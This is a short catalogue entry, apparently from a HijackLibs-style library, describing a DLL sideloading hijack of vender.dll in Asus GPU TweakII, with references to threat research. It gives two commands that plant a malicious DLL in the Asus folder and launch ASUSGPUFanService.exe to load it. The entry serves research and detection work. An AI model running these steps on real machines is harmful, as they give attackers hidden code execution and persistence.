---
trust_level: community
id: windows-dllhijack-vender
namespace: windows:dllhijack:vender
name: vender.dll
description: "vender.dll — Sideloading hijacking (Asus)"
author: "Wietze Beukema"
version: "1.0.0"
capabilities:
  - security.defenseevasion.dll-hijack
platforms:
  - windows
techniques:
  - defense-evasion
  - persistence
execution:
  template: "vender.dll"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
references:
  - label: "Reference"
    url: "https://decoded.avast.io/threatintel/apt-treasure-trove-avast-suspects-chinese-apt-group-mustang-panda-is-collecting-data-from-burmese-government-agencies-and-opposition-groups/"
  - label: "HijackLibs"
    url: "https://hijacklibs.net/entries/vender.html"
---
examples:
  - description: "Place malicious vender.dll in the search order location"
    command: "copy malicious.dll \"%PROGRAMFILES%\\ASUS\\GPU TweakII\\vender.dll\""
  - description: "Execute the vulnerable binary to trigger the hijack"
    command: "\"%PROGRAMFILES%\\ASUS\\GPU TweakII\\ASUSGPUFanService.exe\""

# vender.dll

**Vendor:** Asus

**Expected Location:** %PROGRAMFILES%\ASUS\GPU TweakII

**Vulnerable Executables:**
- %PROGRAMFILES%\ASUS\GPU TweakII\ASUSGPUFanService.exe (Sideloading)
